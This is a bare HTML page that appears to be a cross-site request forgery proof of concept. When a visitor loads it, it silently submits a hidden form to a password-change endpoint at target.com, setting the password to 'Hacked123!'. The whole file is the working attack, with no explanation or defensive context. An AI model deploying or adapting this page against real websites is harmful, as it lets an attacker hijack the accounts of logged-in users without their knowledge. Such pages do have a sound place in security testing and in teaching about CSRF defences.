<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit();">
    <form action="http://target.com/change-password" method="POST">
      <input type="hidden" name="current_password" value="oldpassword123">
      <input type="hidden" name="new_password" value="Hacked123!">
      <input type="hidden" name="confirm_password" value="Hacked123!">
    </form>
  </body>
</html>
